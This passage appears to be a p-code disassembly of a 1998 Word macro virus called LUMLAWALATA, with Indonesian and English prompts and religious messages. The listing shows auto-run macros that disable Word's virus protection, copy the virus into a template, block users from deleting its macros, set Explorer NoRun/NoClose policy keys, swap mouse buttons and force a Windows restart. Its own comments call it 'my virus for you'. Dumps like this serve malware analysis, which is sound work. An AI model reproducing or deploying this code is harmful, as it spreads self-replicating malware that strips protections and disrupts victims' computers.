' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 " Apakah Anda ingin merekam makro..?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x000B "LUMLAWALATA"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Send 0x0000 
' 	EndIf 
' Line #166:
' 	LitStr 0x0026 "%m%s{down}~%d'Macro non-LUMLAWALATA'%m"
' 	ArgsCall Keys 0x0001 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub AutoExec())
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #171:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #172:
' 	ArgsCall LumMaster 0x0000 
' Line #173:
' 	ArgsCall WBT 0x0000 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #175:
' 	ArgsCall WBF 0x0000 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub AutoExit())
' Line #180:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #181:
' 	OnError batal 
' Line #182:
' 	ArgsCall WBT 0x0000 
' Line #183:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #184:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #185:
' 	LitVarSpecial (True)
' 	St afound 
' Line #186:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #187:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x000B "LumNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #188:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #189:
' Line #190:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #192:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #193:
' 	ArgsCall LumMaster 0x0000 
' Line #194:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #195:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000C "\LumNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #196:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000C "\LumNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #197:
' 	EndWith 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #200:
' 	Label batal 
' Line #201:
' 	ArgsCall WBF 0x0000 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub ToolsMacro())
' Line #204:
' 	ArgsCall WBF 0x0000 
' Line #205:
' 	OnError batal 
' Line #206:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #207:
' 	Ld NonLUMLAWALATA 
' 	IfBlock 
' Line #208:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0014 ".lawalata.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #209:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #210:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #211:
' 	LitStr 0x007E "Macros LUMLAWALATA mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-LUMLAWALATA')"
' 	MemStWith Description 
' Line #212:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #213:
' 	EndWith 
' Line #214:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #215:
' 	ElseBlock 
' Line #216:
' 	ArgsCall ViewVbCode 0x0000 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Label batal 
' Line #219:
' 	EndSub 
' Line #220:
' 	FuncDefn (Sub FileTemplates())
' Line #221:
' 	ArgsCall WBF 0x0000 
' Line #222:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Sub FormatStyle())
' Line #225:
' 	ArgsCall WBF 0x0000 
' Line #226:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Function Refresh())
' Line #229:
' 	LitVarSpecial (True)
' 	St reset 
' Line #230:
' 	ArgsCall FileTemplates 0x0000 
' Line #231:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #232:
' 	EndFunc 
' Line #233:
' 	FuncDefn (Sub AutoClose())
' Line #234:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #235:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #236:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #237:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #239:
' 	EndWith 
' Line #240:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B "LUMLAWALATA"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000B "LumNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall LumMaster 0x0000 
' 	EndIf 
' Line #241:
' 	EndSub 
' Line #242:
' 	FuncDefn (Sub FileExit())
' Line #243:
' 	ArgsCall AutoExit 0x0000 
' Line #244:
' 	EndSub 
' Line #245:
' 	FuncDefn (Sub ToolsOptions())
' Line #246:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #247:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #248:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #249:
' 	EndSub 
' Line #250:
' 	FuncDefn (Function WBT())
' Line #251:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #252:
' 	EndFunc 
' Line #253:
' 	FuncDefn (Function WBF())
' Line #254:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #255:
' 	EndFunc 
' Line #256:
' 	FuncDefn (Sub Kaspo())
' Line #257:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0005 "NoRun"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #258:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0007 "NoClose"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #259:
' 	LitStr 0x0005 "ISLAM"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #260:
' 	LitStr 0x0016 "The Power of The World"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #261:
' 	EndSub 
' Line #262:
' 	FuncDefn (Sub GantiMouse())
' Line #263:
' 	OnError MouseCrash 
' Line #264:
' 	LitHI2 0x0004 
' 	ArgsCall SwapMouseButton 0x0001 
' Line #265:
' 	Label MouseCrash 
' Line #266:
' 	EndSub 
' Line #267:
' Line #268:
' 	FuncDefn (Sub RestartWin())
' Line #269:
' 	OnError RestartErr 
' Line #270:
' 	LitHI2 0x0002 
' 	LitHI4 0xFFFF 0xFFFF 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #271:
' 	Label RestartErr 
' Line #272:
' 	EndSub 
' Line #273:
' Line #274:
' 	FuncDefn (Sub TulisTeks())
' Line #275:
' 	OnError TulisErr 
' Line #276:
' 	ArgsCall (Call) barisakhir 0x0000 
' Line #277:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #278:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #279:
' 	LitStr 0x0033 "Maaf jika tulisan kecil ini mengganggu kerja Anda !"
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #280:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #281:
' 	LitStr 0x0045 "Saya hanya mengingatkan Anda untuk tidak terlalu tegang dalam bekerja"
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #282:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #283:
' 	LitStr 0x004D "Gunakan waktu Anda selain untuk bekerja juga untuk beristirahat dengan nyaman"
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #284:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #285:
' 	LitStr 0x001B "Ingat !!! WAKTU adalah UANG"
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #286:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #287:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #288:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Italic 
' Line #289:
' 	LitStr 0x000C "LUM LAWALATA"
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #290:
' 	Label TulisErr 
' Line #291:
' 	EndSub 
' Line #292:
' Line #293:
' 	FuncDefn (Sub Tanya())
' Line #294:
' 	OnError TanyaErr 
' Line #295:
' 	Ld System 
' 	MemLd Country 
' 	LitDI2 0x003E 
' 	Eq 
' 	IfBlock 
' Line #296:
' 	LitStr 0x0016 "Anda suka Muslim ??!?!"
' 	Ld vbYesNo 
' 	LitStr 0x0012 "Assalamu'alaikum.."
' 	ArgsLd MsgBox 0x0003 
' 	St takon 
' Line #297:
' 	ElseBlock 
' Line #298:
' 	LitStr 0x0018 "Do you like MOSLEM ??!?!"
' 	Ld vbYesNo 
' 	LitStr 0x0012 "Assalamu'alaikum.."
' 	ArgsLd MsgBox 0x0003 
' 	St takon 
' Line #299:
' 	EndIfBlock 
' Line #300:
' Line #301:
' 	Ld takon 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #302:
' 	Ld System 
' 	MemLd Country 
' 	LitDI2 0x003E 
' 	Eq 
' 	IfBlock 
' Line #303:
' 	LitStr 0x0024 "Semoga Allah SWT selalu bersama Anda"
' 	ParamOmitted 
' 	LitStr 0x000B "LUMLAWALATA"
' 	ArgsLd MsgBox 0x0003 
' 	St xx 
' Line #304:
' 	ElseBlock 
' Line #305:
' 	LitStr 0x0017 "May ALLAH SWT BLESS YOU"
' 	ParamOmitted 
' 	LitStr 0x000B "LUMLAWALATA"
' 	ArgsLd MsgBox 0x0003 
' 	St xx 
' Line #306:
' 	EndIfBlock 
' Line #307:
' 	ElseBlock 
' Line #308:
' 	ArgsCall Kaspo 0x0000 
' Line #309:
' 	ArgsCall GantiMouse 0x0000 
' Line #310:
' 	ArgsCall RestartWin 0x0000 
' Line #311:
' 	EndIfBlock 
' Line #312:
' 	Label TanyaErr 
' Line #313:
' 	EndSub 
' Line #314:
' 	FuncDefn (Public Sub NoMacro())
' Line #315:
' 	EndSub 
' Line #316:
' 	FuncDefn (Function barisawal())
' Line #317:
' 	Ld wdGotoEnd 
' 	ParamNamed What 
' 	Ld Selection 
' 	ArgsMemCall If 0x0001 
' Line #318:
' 	Ld Selection 
' 	ArgsMemCall InsertBreak 0x0000 
' Line #319:
' 	EndFunc 
' Line #320:
' 	FuncDefn (Function barisakhir())
' Line #321:
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToRelative 
' 	ParamNamed Which 
' 	LitDI4 0x4A80 0x055D 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall If 0x0003 
' Line #322:
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0000 
' Line #323:
' 	EndFunc 
' Line #324:
' 	FuncDefn (Sub asal())
' Line #325:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0005 "NoRun"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #326:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0007 "NoClose"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #327:
' 	EndSub 
' Macros/VBA/LUMLAWALATA - 9183 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' 	QuoteRem 0x0000 0x000E "Dear you ....."
' Line #41:
' 	QuoteRem 0x0000 0x0017 "It's my virus for you !"
' Line #42:
' 	QuoteRem 0x0000 0x0016 "My Name is LUMLAWALATA"
' Line #43:
' 	QuoteRem 0x0000 0x0007 "Thank's"
' Line #44:
' 	QuoteRem 0x0000 0x0022 "=================================="
' Line #45:
' 	QuoteRem 0x0000 0x0027 "I'm a friendly Virus always try say...."
' Line #46:
' 	QuoteRem 0x0000 0x001E "Pray...pray....and... PRAY !!!"
' Line #47:
' 	QuoteRem 0x0000 0x000F "I Love ISLAM !!"
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0004 
' 	VarDefn Teks (As String)
' Line #102:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #103:
' 	Do 
' Line #104:
' 	StartWithExpr 
' 	Ld LUMLAWALATA 
' 	With 
' Line #105:
' 	MemLdWith Height 
' 	LitDI2 0x000A 
' 	Sub 
' 	MemStWith Height 
' Line #106:
' 	MemLdWith With 
' 	LitDI2 0x000F 
' 	Sub 
' 	MemStWith With 
' Line #107:
' 	MemLdWith Height 
' 	LitDI2 0x0019 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #108:
' 	EndWith 
' Line #109:
' 	ArgsCall Beep 0x0000 
' Line #110:
' 	Loop 
' Line #111:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #114:
' 	ArgsCall TT 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub TT())
' Line #117:
' 	Dim 
' 	VarDefn a (As Byte)
' 	VarDefn diam (As Boolean)
' Line #118:
' 	Dim 
' 	VarDefn tp
' 	VarDefn tm
' 	VarDefn sel
' 	VarDefn i
' Line #119:
' 	LitDI2 0x0001 
' 	St a 
' Line #120:
' 	LitVarSpecial (True)
' 	St diam 
' Line #121:
' 	LitVarSpecial (False)
' 	Ld LUMLAWALATA 
' 	MemSt Enabled 
' Line #122:
' 	Do 
' Line #123:
' 	ArgsCall DoEvents 0x0000 
' Line #124:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	St sel 
' Line #125:
' 	Ld tp 
' 	LitDI2 0x0001 
' 	Add 
' 	St tp 
' Line #126:
' 	Ld tp 
' 	LitDI2 0x012C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #127:
' 	Ld LUMLAWALATA 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld tp 
' 	LitDI2 0x0258 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LitHI4 0x0009 0x8000 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld sel 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Gt 
' 	IfBlock 
' Line #133:
' 	Ld Timer 
' 	St tm 
' Line #134:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #135:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0010 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld Image1 
' 	MemLd With 
' 	Ld Label1 
' 	MemSt With 
' 	EndIf 
' Line #136:
' 	Ld Label1 
' 	MemLd Caption 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld Label1 
' 	MemSt Caption 
' Line #137:
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0004 "[! ]"
' 	Like 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Beep 0x0000 
' 	EndIf 
' Line #138:
' 	Ld Label1 
' 	MemLd Caption 
' 	FnLen 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	FnLen 
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld diam 
' 	IfBlock 
' Line #140:
' 	Do 
' Line #141:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #142:
' 	ArgsCall DoEvents 0x0000 
' Line #143:
' 	Ld LUMLAWALATA 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #144:
' 	Loop 
' Line #145:
' 	LitVarSpecial (False)
' 	St diam 
' Line #146:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo catat 
' 	EndIf 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	Ld Label2 
' 	MemLd LBound 
' 	LitDI2 0x0009 
' 	Sub 
' 	Ld Label2 
' 	ArgsMemCall Move 0x0001 
' Line #149:
' 	Ld Label2 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd LBound 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	GoSub catat 
' 	EndIf 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	Loop 
' Line #153:
' 	ExitSub 
' Line #154:
' 	Label catat 
' Line #155:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Label1 
' 	MemSt Caption 
' 	EndIf 
' Line #156:
' 	Ld Timer 
' 	St tm 
' Line #157:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #158:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Add 
' 	St a 
' Line #159:
' 	LitDI2 0x0000 
' 	St i 
' Line #160:
' 	LitVarSpecial (True)
' 	St diam 
' Line #161:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #162:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #163:
' 	LitVarSpecial (True)
' 	Ld Frame1 
' 	MemSt Visible 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld Image1 
' 	MemSt Visible 
' Line #165:
' 	LitVarSpecial (True)
' 	Ld LUMLAWALATA 
' 	MemSt Enabled 
' Line #166:
' 	Ld CommandButton1 
' 	ArgsMemCall SetFocus 0x0000 
' Line #167:
' 	LineCont 0x0004 0C 00 0C 00
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsLd LoadPicture 0x0001 
' 	Ld Image1 
' 	MemSt Picture 
' Line #168:
' 	ExitSub 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Return 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Private Sub UserForm_Layout())
' Line #173:
' 	Dim 
' 	VarDefn waktu
' 	VarDefn shalat
' Line #174:
' 	Ld Time 
' 	LitStr 0x0002 "hh"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	St waktu 
' Line #175:
' 	Ld waktu 
' 	SelectCase 
' Line #176:
' 	LitDI2 0x000C 
' 	LitDI2 0x000E 
' 	CaseTo 
' 	CaseDone 
' Line #177:
' 	LitStr 0x0006 "DZUHUR"
' 	St shalat 
' Line #178:
' 	LitDI2 0x000F 
' 	LitDI2 0x0011 
' 	CaseTo 
' 	CaseDone 
' Line #179:
' 	LitStr 0x0005 "ASHAR"
' 	St shalat 
' Line #180:
' 	LitDI2 0x0012 
' 	LitDI2 0x0012 
' 	CaseTo 
' 	CaseDone 
' Line #181:
' 	LitStr 0x0007 "MAGHRIB"
' 	St shalat 
' Line #182:
' 	LitDI2 0x0013 
' 	LitDI2 0x0017 
' 	CaseTo 
' 	CaseDone 
' Line #183:
' 	LitStr 0x0004 "ISYA"
' 	St shalat 
' Line #184:
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	CaseTo 
' 	CaseDone 
' Line #185:
' 	LitStr 0x0004 "ISYA"
' 	St shalat 
' Line #186:
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	CaseTo 
' 	CaseDone 
' Line #187:
' 	LitStr 0x0005 "SUBUH"
' 	St shalat 
' Line #188:
' 	CaseElse 
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #190:
' 	EndSelect 
' Line #191:
' 	Ld System 
' 	MemLd Country 
' 	LitDI2 0x003E 
' 	Eq 
' 	IfBlock 
' Line #192:
' 	LitStr 0x007C "Maaf !! Mungkin kehadiran LUMLAWALATA mengganggu kesibukan Anda, untuk itu sekali lagi maafkanlah kelancangan LUMLAWALATA .."
' 	LitDI2 0x0001 
' 	ArgsSt Teks 0x0001 
' Line #193:
' 	LitStr 0x0067 "Ingat...!! Kerja boleh tapi ingat istirahatlah sejenak biar enggak stres, pusing, uring-uringan, dsb..!"
' 	LitDI2 0x0002 
' 	ArgsSt Teks 0x0001 
' Line #194:
' 	LitStr 0x004C "Untuk itu... istirahatlah yang cukup, hanya itu yang LUMLAWALATA sampaikan !"
' 	LitDI2 0x0003 
' 	ArgsSt Teks 0x0001 
' Line #195:
' 	LitStr 0x001E "SHOLATlah sebelum di SHOLATkan"
' 	LitDI2 0x0004 
' 	ArgsSt Teks 0x0001 
' Line #196:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #197:
' 	LitStr 0x0004 "By :"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "LUM LAWALATA '98"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "Thanks to : "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Label3 
' 	MemSt Caption 
' Line #198:
' 	LitStr 0x0019 "Apakah Anda sudah sholat "
' 	Ld shalat 
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	Ld Label4 
' 	MemSt Caption 
' Line #199:
' 	ElseBlock 
' Line #200:
' 	LitStr 0x002D "So sorry ...!! I visit your PC without ...???"
' 	LitDI2 0x0001 
' 	ArgsSt Teks 0x0001 
' Line #201:
' 	LitStr 0x002A "Remember!! The MOSLEM POWER is NEVER DIE !"
' 	LitDI2 0x0002 
' 	ArgsSt Teks 0x0001 
' Line #202:
' 	LitStr 0x0016 "I Suggest you to ....."
' 	LitDI2 0x0003 
' 	ArgsSt Teks 0x0001 
' Line #203:
' 	LitStr 0x0042 "Toreh..toreh.. Mon e' angguy komputer paneka ! On laon bein Cong !"
' 	LitDI2 0x0004 
' 	ArgsSt Teks 0x0001 
' Line #204:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #205:
' 	LitStr 0x0004 "By :"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "LUM LAWALATA '98"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "Thanks to : "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Label3 
' 	MemSt Caption 
' Line #206:
' 	LitStr 0x0009 "Have the "
' 	Ld shalat 
' 	Concat 
' 	LitStr 0x0008 " Pray ?!"
' 	Concat 
' 	Ld Label4 
' 	MemSt Caption 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	EndSub 
' Line #209:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #210:
' 	Dim 
